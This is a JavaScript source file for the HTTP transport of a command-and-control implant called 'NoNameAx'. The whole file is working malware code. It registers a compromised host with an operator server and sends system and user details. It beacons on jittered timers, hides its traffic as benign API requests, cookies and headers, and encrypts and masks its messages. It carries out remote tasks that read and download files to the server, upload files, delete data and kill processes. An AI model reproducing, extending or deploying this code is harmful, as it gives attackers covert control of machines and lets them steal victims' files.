// nhttp.js — NoNameAx (NaX) HTTP transport for LOIS (ticket 014).
// Pure JS, zero deps. Ported from the canonical Go/C sources
// (listener_nonameax_http/pl_*.go, agent_nonameax/pl_*.go, src_beacon).
//
// Wire summary (all integers little-endian):
//   frame      = type(1) | flags(1)=0 | bodylen(u32) | body
//   envelope   = IV(16) | AES-128-CBC-PKCS7(frame, encrypt_key)
//   REGISTER   = 0x01, POST raw body to post_uris[0] (pre-profile fallback)
//   HEARTBEAT  = 0x02 (empty body), GET, encoded per get.client_meta
//   RESULT     = 0x03, one POST per completed task (Post.ClientOutput, body)
//   server->agent: NO_TASKS 0x80 / TASK 0x81 / PROFILE 0x82 (concatenated)
//   beacon id  = 8 random bytes hex (16 ascii chars) in the beacon-id header
//   TASK body  = task_id(u32) | cmd_id(u8) | args_len(u32) | args
//   RESULT body= task_id(u32) | status(u8) | data_len(u32) | data
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { hostInfo } = require('./config');

// ---- frame layer ---------------------------------------------------------------
const T = { REGISTER: 0x01, HEARTBEAT: 0x02, RESULT: 0x03, NO_TASKS: 0x80, TASK: 0x81, PROFILE: 0x82 };

function frame(type, body) {
  const b = body || Buffer.alloc(0);
  const h = Buffer.allocUnsafe(6);
  h[0] = type; h[1] = 0;
  h.writeUInt32LE(b.length, 2);
  return Buffer.concat([h, b]);
}

function* walkFrames(buf) {
  let pos = 0;
  while (pos + 6 <= buf.length) {
    const type = buf[pos]; // buf[pos+1] = flags (reserved, 0)
    const len = buf.readUInt32LE(pos + 2);
    if (pos + 6 + len > buf.length) return; // truncated -> stop
    yield { type, body: buf.subarray(pos + 6, pos + 6 + len) };
    pos += 6 + len;
  }
}

// ---- crypto --------------------------------------------------------------------
const aesEnc = (data, key) => {
  const iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-128-cbc', key, iv);
  return Buffer.concat([iv, c.update(data), c.final()]);
};
const aesDec = (env, key) => {
  if (env.length < 32) throw new Error('short envelope');
  const d = crypto.createDecipheriv('aes-128-cbc', key, env.subarray(0, 16));
  return Buffer.concat([d.update(env.subarray(16)), d.final()]);
};

// ---- profile transforms (OutputConfig) ------------------------------------------
const DEFAULT_GET_META = { format: 'base64', mask: false, placement: 'cookie', name: '__cid', prepend: '', append: '', empty_resp: '' };
const DEFAULT_RAW_BODY = { format: 'raw', mask: false, placement: 'body', name: '', prepend: '', append: '', empty_resp: '' };

function xorMask(data) {
  const k = crypto.randomBytes(4);
  const out = Buffer.allocUnsafe(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ k[i % 4];
  return Buffer.concat([k, out]);
}
function xorUnmask(data) {
  if (data.length < 4) throw new Error('short mask');
  const k = data.subarray(0, 4), out = Buffer.allocUnsafe(data.length - 4);
  for (let i = 4; i < data.length; i++) out[i - 4] = data[i] ^ k[i % 4];
  return out;
}
function fmtEnc(data, format) {
  if (format === 'base64') return Buffer.from(data.toString('base64'));
  if (format === 'base64url') return Buffer.from(data.toString('base64url'));
  if (format === 'hex') return Buffer.from(data.toString('hex'));
  return data;
}
function fmtDec(data, format) {
  const s = data.toString('latin1').trim();
  if (format === 'base64' || format === 'base64url') return Buffer.from(s, 'base64');
  if (format === 'hex') return Buffer.from(s, 'hex');
  return data;
}
function encodeOutput(oc, plain) {
  let d = plain;
  if (oc.mask) d = xorMask(d);
  d = fmtEnc(d, oc.format);
  return Buffer.concat([Buffer.from(oc.prepend || '', 'latin1'), d, Buffer.from(oc.append || '', 'latin1')]);
}
function decodeOutput(oc, wire) {
  let d = wire;
  if (oc.prepend && d.subarray(0, oc.prepend.length).toString('latin1') === oc.prepend) d = d.subarray(oc.prepend.length);
  if (oc.append && oc.append.length && d.subarray(d.length - oc.append.length).toString('latin1') === oc.append) d = d.subarray(0, d.length - oc.append.length);
  d = fmtDec(d, oc.format);
  if (oc.mask) d = xorUnmask(d);
  return d;
}

// ---- binary writer/reader (LE) ----------------------------------------------------
class W {
  constructor() { this.parts = []; }
  u8(v) { this.parts.push(Buffer.from([v & 0xff])); return this; }
  u16(v) { const b = Buffer.allocUnsafe(2); b.writeUInt16LE(v & 0xffff, 0); this.parts.push(b); return this; }
  u32(v) { const b = Buffer.allocUnsafe(4); b.writeUInt32LE(v >>> 0, 0); this.parts.push(b); return this; }
  lp16(s) { const b = Buffer.from(String(s ?? ''), 'utf8'); this.u16(b.length); this.parts.push(b); return this; }
  lp32(s) { const b = Buffer.from(String(s), 'utf8'); this.u32(b.length); this.parts.push(b); return this; }
  raw(b) { this.parts.push(Buffer.from(b)); return this; }
  build() { return Buffer.concat(this.parts); }
}
class R {
  constructor(buf) { this.buf = buf; this.pos = 0; }
  u8() { return this.buf[this.pos++]; }
  u16() { const v = this.buf.readUInt16LE(this.pos); this.pos += 2; return v; }
  u32() { const v = this.buf.readUInt32LE(this.pos); this.pos += 4; return v; }
  lp16() { const n = this.u16(); const s = this.buf.subarray(this.pos, this.pos + n).toString('utf8'); this.pos += n; return s; }
  strlist() { const n = this.u16(); const out = []; for (let i = 0; i < n; i++) out.push(this.lp16()); return out; }
  get left() { return this.buf.length - this.pos; }
}
function readOC(r) {
  const format = ['raw', 'base64', 'base64url', 'hex'][r.u8()] || 'raw';
  const mask = r.u8() === 1;
  const placement = ['body', 'header', 'cookie', 'parameter'][r.u8()] || 'body';
  return { format, mask, placement, name: r.lp16(), prepend: r.lp16(), append: r.lp16(), empty_resp: r.lp16() };
}

// PROFILE v2 parse (EncodeProfileBodyV2 mirror). Hosts deliberately NOT adopted —
// our baked redirector hosts stay authoritative (C never rotates hosts either).
function parseProfile(body, prof) {
  const r = new R(body);
  const version = r.u8();
  if (version !== 2) throw new Error('profile version ' + version);
  prof.rotation = r.u8() === 1 ? 'random' : 'sequential';
  const ua = r.lp16(); if (ua) prof.user_agent = ua;
  const bid = r.lp16(); if (bid) prof.bid_header = bid;
  r.strlist(); // hosts — not adopted
  prof.error_status = r.u16();
  prof.error_body = r.lp16();
  prof.error_headers = r.strlist();
  const gu = r.strlist(); if (gu.length) prof.get_uris = gu;
  prof.get_client_meta = readOC(r);
  prof.get_client_headers = r.strlist();
  prof.get_client_params = r.strlist();
  prof.get_server_output = readOC(r);
  prof.get_server_headers = r.strlist();
  const pu = r.strlist(); if (pu.length) prof.post_uris = pu;
  prof.post_client_meta = readOC(r);
  if (r.left > 0) prof.post_client_output = readOC(r); // absent in GET-era frames
  if (r.left > 0) prof.post_client_headers = r.strlist();
  if (r.left > 0) prof.post_server_output = readOC(r);
  if (r.left > 0) prof.post_server_headers = r.strlist();
  return prof;
}

// ---- command ids (agent_nonameax/pl_main.go) -------------------------------------
const NC = {
  WHOAMI: 0x10, SLEEP: 0x11, EXIT_THREAD: 0x12, EXIT_PROC: 0x13,
  CD: 0x14, PWD: 0x15, MKDIR: 0x16, RMDIR: 0x17, CAT: 0x18, LS: 0x19,
  CP: 0x1A, MV: 0x1B, DOWNLOAD: 0x22, PS_LIST: 0x23, PS_KILL: 0x24,
  UPLOAD: 0x26, RM: 0x27, SAVEMEMORY: 0x2A, PROFILE: 0x30,
};
const ST = { OK: 0, ERR: 1 };
const WIN32 = { EACCES: 5, EPERM: 5, ENOENT: 2, ENOTDIR: 3, EEXIST: 80, ENOTEMPTY: 145, EISDIR: 2, EINVAL: 87 };
const errCode = (e) => WIN32[e && e.code] || 1;

function ipDotted(v) { return [(v >>> 24) & 255, (v >>> 16) & 255, (v >>> 8) & 255, v & 255].join('.'); }

function defaultProfile(cfg) {
  return {
    rotation: cfg.rotation === 'random' ? 'random' : 'sequential',
    user_agent: cfg.user_agent,
    bid_header: cfg.hb_header || 'X-Correlation-Id',
    get_uris: cfg.get_uris && cfg.get_uris.length ? cfg.get_uris : ['/api/v2/health'],
    get_client_meta: cfg.get_client_meta || DEFAULT_GET_META,
    get_client_headers: cfg.get_client_headers || [],
    get_client_params: cfg.get_client_params || [],
    get_server_output: cfg.get_server_output || { ...DEFAULT_RAW_BODY },
    get_server_headers: [],
    post_uris: cfg.post_uris && cfg.post_uris.length ? cfg.post_uris : ['/api/v2/events'],
    post_client_meta: cfg.post_client_meta || { format: 'raw', mask: false, placement: 'header', name: cfg.hb_header || 'X-Correlation-Id', prepend: '', append: '', empty_resp: '' },
    post_client_output: cfg.post_client_output || { ...DEFAULT_RAW_BODY },
    post_client_headers: cfg.post_client_headers || [],
    post_server_output: cfg.post_server_output || { ...DEFAULT_RAW_BODY },
    post_server_headers: [],
    error_status: 404, error_body: '', error_headers: [],
  };
}

module.exports = { run, frame, walkFrames, aesEnc, aesDec, encodeOutput, decodeOutput, parseProfile, T, NC };

// ---- the agent ---------------------------------------------------------------------
async function run(cfg) {
  const log = (m) => { if (!cfg.debug) return; console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`); };
  const key = Buffer.from(cfg.encrypt_key, 'hex');
  const info = hostInfo(cfg);
  const prof = defaultProfile(cfg);
  const sessionId = crypto.randomBytes(8).toString('hex'); // 16 ascii chars = agent uid
  const ep = cfg.endpoints[0];
  const state = {
    cwd: process.cwd(), downloads: new Map(), memory: new Map(),
    registered: false, exit: false,
    sleepMs: (cfg.sleep_delay || 30) * 1000, jitter: cfg.jitter_delay || 0,
    getIdx: 0, postIdx: 0,
  };
  const maxCycles = process.env.LOIS_MAX_CYCLES ? parseInt(process.env.LOIS_MAX_CYCLES, 10) : Infinity;

  log('[*] ' + sessionId + ' -> ' + ep.host + ':' + ep.port);

  function pick(list, which) {
    if (prof.rotation === 'random') return list[Math.floor(Math.random() * list.length)];
    const i = state[which] % list.length;
    state[which] = (state[which] + 1) % list.length;
    return list[i];
  }

  function requestRaw(method, uri, headers, body) {
    const transport = cfg.ssl ? https : http;
    return new Promise((resolve, reject) => {
      const req = transport.request({
        host: ep.host, port: ep.port, path: uri, method, headers,
        timeout: 15000, ...(cfg.ssl ? { rejectUnauthorized: false } : {}),
      }, (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('error', reject);
        res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
      });
      req.on('error', reject);
      req.on('timeout', () => req.destroy(new Error('timeout')));
      if (body && body.length) req.write(body);
      req.end();
    });
  }

  function hdrs(which, extra) {
    // beacon-id header always present; profile client headers per direction
    const h = { 'User-Agent': prof.user_agent, [prof.bid_header]: sessionId };
    const list = which === 'post' ? prof.post_client_headers : prof.get_client_headers;
    for (const line of list) { const i = line.indexOf(':'); if (i > 0) h[line.slice(0, i).trim()] = line.slice(i + 1).trim(); }
    return Object.assign(h, extra || {});
  }

  function withParams(uri, oc, value, which) {
    let u = uri;
    if (oc.placement === 'parameter') u += (u.includes('?') ? '&' : '?') + oc.name + '=' + encodeURIComponent(value);
    const plist = which === 'post' ? [] : prof.get_client_params;
    for (const kv of plist) u += (u.includes('?') ? '&' : '?') + kv;
    return u;
  }

  function metaHdr(oc, env) {
    const val = encodeOutput(oc, env).toString('latin1');
    if (oc.placement === 'cookie') return { Cookie: oc.name + '=' + val };
    if (oc.placement === 'header') return { [oc.name]: val };
    return {};
  }

  async function register() {
    // NaxBuildRegBody: lp16 host, lp16 user, arch u8, pid u32, sleep_ms u32,
    // then the tolerated-truncation extension fields in order
    const b = new W()
      .lp16(info.computer_name).lp16(info.username)
      .u8(info.arch64 ? 1 : 2).u32(info.pid).u32(state.sleepMs)
      .u32(0).lp16(ipDotted(info.internal_ip)).lp16(info.domain_name)
      .lp16(info.process_name).u8(info.elevated ? 1 : 0)
      .u32(info.major_version).u32(info.minor_version).u16(info.build_number & 0xffff)
      .u32(process.ppid || 0).u32(info.acp).u32(info.oemcp).lp16(process.execPath)
      .build();
    const env = aesEnc(frame(T.REGISTER, b), key);
    // pre-profile fallback: raw body, only beacon-id + content-type headers
    const res = await requestRaw('POST', prof.post_uris[0],
      { [prof.bid_header]: sessionId, 'Content-Type': 'application/octet-stream' }, env);
    if (res.status !== 200 || !res.body.length) throw new Error('register status ' + res.status);
    const plain = aesDec(decodeOutput(prof.post_server_output, res.body), key);
    for (const f of walkFrames(plain)) {
      if (f.type === T.PROFILE) {
        try { parseProfile(f.body, prof); } catch (_) {}
        state.registered = true;
        log('[+] registered (profile applied)');
      }
    }
    if (!state.registered) throw new Error('no PROFILE in register reply');
  }

  async function postResult(taskId, status, data) {
    const env = aesEnc(frame(T.RESULT, new W().u32(taskId).u8(status).u32(data.length).raw(data).build()), key);
    const body = encodeOutput(prof.post_client_output, env);
    // Post.ClientMeta places the *session id* (ignored server-side; spec §0) —
    // never the envelope. The beacon-id header already carries it too.
    const meta = prof.post_client_meta;
    const extra = { 'Content-Type': 'application/octet-stream' };
    if (meta.placement === 'cookie') extra['Cookie'] = `${meta.name}=${sessionId}`;
    else if (meta.placement === 'header' && meta.name.toLowerCase() !== prof.bid_header.toLowerCase()) extra[meta.name] = sessionId;
    const uri = withParams(pick(prof.post_uris, 'postIdx'), meta, sessionId, 'post');
    const res = await requestRaw('POST', uri, hdrs('post', extra), body);
    return res.status === 200;
  }

  // one chunk per cycle; FINISH goes out the cycle after the last CONTINUE
  function pumpDownload() {
    for (const [taskId, d] of state.downloads) {
      if (d.off >= d.size) {
        try { fs.closeSync(d.fd); } catch (_) {}
        state.downloads.delete(taskId);
        return { taskId, status: ST.OK, data: new W().u8(3).u32(d.fileId).build() };
      }
      const chunk = Buffer.allocUnsafe(Math.min(d.chunkSize, d.size - d.off));
      const n = fs.readSync(d.fd, chunk, 0, chunk.length, d.off);
      if (n <= 0) { // mid-stream read error: silently drop (C parity)
        try { fs.closeSync(d.fd); } catch (_) {}
        state.downloads.delete(taskId);
        return null;
      }
      d.off += n;
      return { taskId, status: ST.OK, data: new W().u8(2).u32(d.fileId).raw(chunk.subarray(0, n)).build() };
    }
    return null;
  }

  function psListNax() {
    if (process.platform === 'win32') return null; // needs --allow-shellout (ticket 001)
    const rows = [];
    for (const d of fs.readdirSync('/proc')) {
      if (!/^\d+$/.test(d)) continue;
      let name = '', ppid = 0, user = '';
      try { name = fs.readFileSync(`/proc/${d}/comm`, 'utf8').trim(); } catch (_) { continue; }
      try {
        const s = fs.readFileSync(`/proc/${d}/status`, 'utf8');
        const m1 = s.match(/^PPid:\s*(\d+)/m); if (m1) ppid = parseInt(m1[1], 10);
        const m2 = s.match(/^Uid:\s*(\d+)/m); if (m2) user = m2[1] === '0' ? 'root' : m2[1];
      } catch (_) {}
      rows.push({ pid: parseInt(d, 10), ppid, sess: 0, arch: 1, elev: 0, domain: '', user, name });
    }
    return rows;
  }

  function execTask(taskId, cmd, args) {
    const r = new R(args);
    switch (cmd) {
      case NC.WHOAMI:
        return { status: ST.OK, data: Buffer.from(info.username, 'utf8') };
      case NC.SLEEP: {
        const ms = r.u32(); const jit = r.u8();
        state.sleepMs = ms; state.jitter = jit;
        const txt = `sleep=${Math.round(ms / 1000)}s jitter=${jit}%`;
        return { status: ST.OK, data: Buffer.concat([new W().u32(ms).u8(jit).build(), Buffer.from(txt)]) };
      }
      case NC.EXIT_THREAD:
      case NC.EXIT_PROC:
        state.exit = true;
        return null; // no RESULT, ever
      case NC.PWD:
        return { status: ST.OK, data: Buffer.from(state.cwd, 'utf8') };
      case NC.CD: {
        try {
          process.chdir(path.resolve(state.cwd, args.toString('utf8')));
          state.cwd = process.cwd();
          return { status: ST.OK, data: Buffer.alloc(0) };
        } catch (e) { return { status: ST.ERR, data: new W().u32(errCode(e)).build() }; }
      }
      case NC.MKDIR: {
        try {
          fs.mkdirSync(path.resolve(state.cwd, args.toString('utf8')));
          return { status: ST.OK, data: Buffer.alloc(0) };
        } catch (e) { return { status: ST.ERR, data: new W().u32(errCode(e)).build() }; }
      }
      case NC.RM:
      case NC.RMDIR: {
        try {
          const flags = r.u8();
          const p = path.resolve(state.cwd, args.subarray(1).toString('utf8'));
          if (fs.statSync(p).isDirectory()) fs.rmSync(p, { recursive: !!(flags & 1), force: false });
          else fs.unlinkSync(p);
          return { status: ST.OK, data: Buffer.alloc(0) };
        } catch (e) { return { status: ST.ERR, data: new W().u32(errCode(e)).build() }; }
      }
      case NC.CAT: {
        try {
          const buf = fs.readFileSync(path.resolve(state.cwd, args.toString('utf8')));
          return { status: ST.OK, data: buf.subarray(0, 0x100000) }; // 1 MB cap (C caps by buffer)
        } catch (e) { return { status: ST.ERR, data: new W().u32(errCode(e)).build() }; }
      }
      case NC.CP:
      case NC.MV: {
        try {
          const z = args.indexOf(0);
          const src = path.resolve(state.cwd, args.subarray(0, z).toString('utf8'));
          const dst = path.resolve(state.cwd, args.subarray(z + 1).toString('utf8'));
          if (cmd === NC.CP) fs.copyFileSync(src, dst); else fs.renameSync(src, dst);
          return { status: ST.OK, data: Buffer.alloc(0) };
        } catch (e) { return { status: ST.ERR, data: new W().u32(errCode(e)).build() }; }
      }
      case NC.LS: {
        try {
          const flags = r.u8();
          if (flags & 1) return { status: ST.ERR, data: new W().u32(87).build() }; // recursive tree: not in v1
          let dir = args.subarray(1).toString('utf8');
          dir = dir ? path.resolve(state.cwd, dir) : state.cwd;
          const names = fs.readdirSync(dir);
          const w = new W();
          const dirBuf = Buffer.from(dir, 'utf8');
          w.u16(dirBuf.length).raw(dirBuf).u16(names.length);
          for (const n of names) {
            let st = null; try { st = fs.statSync(path.join(dir, n)); } catch (_) {}
            const isDir = st && st.isDirectory();
            const nb = Buffer.from(n, 'utf8');
            w.u8(isDir ? 1 : 0).u8(isDir ? 0x10 : 0x20)
             .u32(st ? (st.size >>> 0) : 0).u32(st ? Math.max(0, Math.floor(st.mtimeMs / 1000)) : 0)
             .u8(Math.min(255, nb.length)).raw(nb.subarray(0, 255));
          }
          return { status: ST.OK, data: w.build() };
        } catch (e) { return { status: ST.ERR, data: new W().u32(errCode(e)).build() }; }
      }
      case NC.PS_LIST: {
        const rows = psListNax();
        if (!rows) return { status: ST.OK, data: new W().u8(0).u32(50).build() }; // unsupported build
        const w = new W();
        w.u8(1).u32(rows.length);
        for (const row of rows) {
          w.u16(row.pid & 0xffff).u16(row.ppid & 0xffff).u16(row.sess & 0xffff)
           .u8(row.arch ? 1 : 0).u8(row.elev ? 1 : 0)
           .lp16(row.domain).lp16(row.user).lp16(row.name);
        }
        return { status: ST.OK, data: w.build() };
      }
      case NC.PS_KILL: {
        const pid = r.u32();
        try { process.kill(pid); } catch (_) {}
        return { status: ST.OK, data: new W().u32(pid).build() };
      }
      case NC.DOWNLOAD: {
        const chunkOverride = r.u32();
        const p = path.resolve(state.cwd, args.subarray(4).toString('utf8'));
        try {
          const st = fs.statSync(p);
          const fd = fs.openSync(p, 'r');
          const fileId = crypto.randomBytes(4).readUInt32LE(0);
          const chunkSize = chunkOverride > 0 ? Math.min(Math.max(chunkOverride, 4096), 0x400000) : 0x200000;
          state.downloads.set(taskId, { fd, size: st.size, off: 0, fileId, chunkSize });
          return { status: ST.OK, data: new W().u8(1).u32(fileId).u32(st.size >>> 0).lp32(path.basename(p)).build() };
        } catch (e) { return { status: ST.ERR, data: new W().u32(errCode(e)).build() }; }
      }
      case NC.SAVEMEMORY: {
        const memId = r.u32(); const total = r.u32(); r.u32(); // chunkSize
        const chunk = args.subarray(12);
        let m = state.memory.get(memId);
        if (!m) { m = { total, parts: [], have: 0 }; state.memory.set(memId, m); }
        m.parts.push(chunk); m.have += chunk.length;
        return { status: ST.OK, data: Buffer.alloc(0) };
      }
      case NC.UPLOAD: {
        const memId = r.u32(); const pathLen = r.u32();
        const target = args.subarray(8, 8 + pathLen).toString('utf8');
        const m = state.memory.get(memId);
        if (!m) return { status: ST.ERR, data: Buffer.alloc(0) }; // unknown id: ERR + empty (C parity)
        try {
          fs.writeFileSync(path.resolve(state.cwd, target), Buffer.concat(m.parts), { flag: 'wx' }); // CREATE_NEW
          state.memory.delete(memId);
          return { status: ST.OK, data: Buffer.alloc(0) };
        } catch (e) { return { status: ST.ERR, data: new W().u32(errCode(e)).build() }; }
      }
      case NC.PROFILE: {
        try { parseProfile(args, prof); return { status: ST.OK, data: Buffer.alloc(0) }; }
        catch (_) { return { status: ST.ERR, data: Buffer.alloc(0) }; }
      }
      default:
        // unknown commands no-op silently — the server's generic path tolerates empty OK
        return { status: ST.OK, data: Buffer.alloc(0) };
    }
  }

  async function beat() {
    const env = aesEnc(frame(T.HEARTBEAT), key);
    const meta = prof.get_client_meta;
    let uri = withParams(pick(prof.get_uris, 'getIdx'), meta, encodeOutput(meta, env).toString('latin1'), 'get');
    const res = await requestRaw('GET', uri, hdrs('get', metaHdr(meta, env)),
      meta.placement === 'body' ? encodeOutput(meta, env) : null);
    if (res.status !== 200) throw new Error('beat status ' + res.status);
    if (!res.body.length) return [];
    if (prof.get_server_output.empty_resp && res.body.toString('latin1') === prof.get_server_output.empty_resp) return [];
    let plain;
    try { plain = aesDec(decodeOutput(prof.get_server_output, res.body), key); }
    catch (_) { return []; } // undecryptable -> empty beat (C parity)
    const tasks = [];
    for (const f of walkFrames(plain)) {
      if (f.type === T.NO_TASKS) break;
      if (f.type === T.PROFILE) { try { parseProfile(f.body, prof); } catch (_) {} continue; }
      if (f.type !== T.TASK) continue;
      const r = new R(f.body);
      const taskId = r.u32(); const cmd = r.u8();
      const alen = r.u32(); const targs = f.body.subarray(r.pos, r.pos + alen);
      tasks.push({ taskId, cmd, args: targs });
    }
    return tasks;
  }

  let cycles = 0;
  for (;;) {
    if (state.exit) break;
    if (++cycles > maxCycles) break;
    try {
      if (!state.registered) {
        await register();
      } else {
        const tasks = await beat();
        log('[*] beat: ' + tasks.length + ' task(s)');
        let busy = false;
        for (const t of tasks) {
          const out = execTask(t.taskId, t.cmd, t.args);
          if (out) { busy = true; await postResult(t.taskId, out.status, out.data); }
          if (state.exit) break;
        }
        const dl = pumpDownload();
        if (dl) { busy = true; await postResult(dl.taskId, dl.status, dl.data); }
        if (busy) continue; // work pending -> re-poll immediately (C parity)
      }
    } catch (e) {
      log('[-] cycle error: ' + (e.stack || e.message));
    }
    // NaxSleep: sleepMs ± jitter% (uniform), Bootstrap.c semantics
    const delta = Math.floor((state.sleepMs / 100) * state.jitter);
    const eff = Math.max(0, state.sleepMs + (delta ? Math.floor(Math.random() * (2 * delta + 1)) - delta : 0));
    await new Promise((r) => setTimeout(r, eff));
  }
}
